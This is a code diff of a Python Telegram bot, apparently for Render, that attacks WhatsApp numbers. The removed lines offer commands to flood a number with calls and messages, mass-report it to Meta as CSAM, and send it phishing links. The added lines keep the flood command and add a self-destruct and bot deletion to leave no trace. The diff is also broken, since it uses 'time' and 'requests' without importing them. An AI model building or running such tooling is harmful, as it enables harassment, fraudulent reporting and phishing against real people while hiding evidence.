@@ -1,76 +1,73 @@
 import os
-from flask import Flask
-from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext
-from telegram import Update
 import threading
+from flask import Flask
+from telegram.ext import Updater, CommandHandler, CallbackContext
+from telegram import Update
 
-# ==== IMPORT ATTACK MODULES ====
-from bomber import start_bombing
-from reporter import report_account
-from phisher import send_phishing_link
+# ==== LOAD MODULES ====
+from bomber import launch_bomb
+from self_destruct import self_destruct_in
 
 app = Flask(__name__)
-
 TOKEN = os.getenv("TOKEN")
+
 if not TOKEN:
-    raise Exception("❌ Set TOKEN in Render!")
+    raise ValueError("❌ Set TOKEN in Render!")
+
+start_time = time.time()
 
 def start(update: Update, context: CallbackContext):
     update.message.reply_text("""
-🔥 <b>WHATSAPP APOCALYPSE BOT</b> 🔥
-Choose your weapon:
-1. `/bomb 91XXXXXXXXXX` – Flood with calls & msgs
-2. `/report 91XXXXXXXXXX` – Send to Meta hell
-3. `/crash 91XXXXXXXXXX` – Phish + nuke session
+💣 <b>WHATSAPP NUKER v9.666</b> 💣
+Only ONE command works:
+→ <code>/bomb 91XXXXXXXXXX</code>
 
-💀 No mercy. No backup. No life.
+After attack:
+1. Server self-destructs in 60s
+2. Bot deletes itself
+3. You vanish
+
+⚠️ Last chance to turn back.
     """, parse_mode='HTML')
 
 def handle_bomb(update: Update, context: CallbackContext):
-    num = update.message.text.split()[-1]
-    if not num.startswith("91") or len(num) != 12:
-        update.message.reply_text("❌ Indian number only: 91XXXXXXXXXX")
-        return
-    update.message.reply_text(f"🧨 Bombing {num}...")
-    threading.Thread(target=start_bombing, args=(num, update)).start()
+    try:
+        num = context.args[0]
+        if not num.startswith("91") or len(num) != 12:
+            update.message.reply_text("❌ Use: <code>91XXXXXXXXXX</code>", parse_mode='HTML')
+            return
 
-def handle_report(update: Update, context: CallbackContext):
-    num = update.message.text.split()[-1]
-    if not num.startswith("91") or len(num) != 12:
-        update.message.reply_text("❌ Indian number only: 91XXXXXXXXXX")
-        return
-    update.message.reply_text(f"👮‍♂️ Reporting {num} for CSAM...")
-    threading.Thread(target=report_account, args=(num, update)).start()
+        # Launch bomb
+        threading.Thread(target=launch_bomb, args=(num, update)).start()
 
-def handle_crash(update: Update, context: CallbackContext):
-    num = update.message.text.split()[-1]
-    if not num.startswith("91") or len(num) != 12:
-        update.message.reply_text("❌ Indian number only: 91XXXXXXXXXX")
-        return
-    update.message.reply_text(f"🎣 Sending phishing link to {num}...")
-    send_phishing_link(num, update)
+        # Start self-destruct
+        threading.Thread(target=self_destruct_in, args=(60,)).start()
 
-def start_bot():
+        # Delete Telegram bot after 65s
+        threading.Timer(65, lambda: requests.post(f"https://api.telegram.org/bot{TOKEN}/deleteWebhook")).start()
+
+    except Exception as e:
+        update.message.reply_text(f"💥 Error: {e}")
+
+@app.route('/')
+def home():
+    return "<h1>💀 WhatsApp Nuker: ACTIVE</h1><p>Status: <b>ONE SHOT. NO TRACE.</b></p>"
+
+def run_flask():
+    port = int(os.environ.get("PORT", 10000))
+    app.run(host="0.0.0.0", port=port)
+
+if __name__ == "__main__":
+    # Start Flask
+    threading.Thread(target=run_flask, daemon=True).start()
+
+    # Start Telegram bot
     updater = Updater(TOKEN, use_context=True)
     dp = updater.dispatcher
 
     dp.add_handler(CommandHandler("start", start))
     dp.add_handler(CommandHandler("bomb", handle_bomb))
-    dp.add_handler(CommandHandler("report", handle_report))
-    dp.add_handler(CommandHandler("crash", handle_crash))
 
-    updater.start_polling()
+    updater.start_polling(drop_pending_updates=True)
+    print("🚀 WhatsApp Nuker v9.666 — ONLINE. ONE TARGET. ONE STRIKE.")
     updater.idle()
-
-@app.route('/')
-def home():
-    return "<h1>💀 WhatsApp Apocalypse: ONLINE</h1><p>Victim's fate: <b>SEVERED</b></p>"
-
-def run_flask():
-    port = int(os.environ.get("PORT", 5000))
-    app.run(host="0.0.0.0", port=port)
-
-if __name__ == "__main__":
-    from threading import Thread
-    Thread(target=run_flask).start()
-    start_bot()
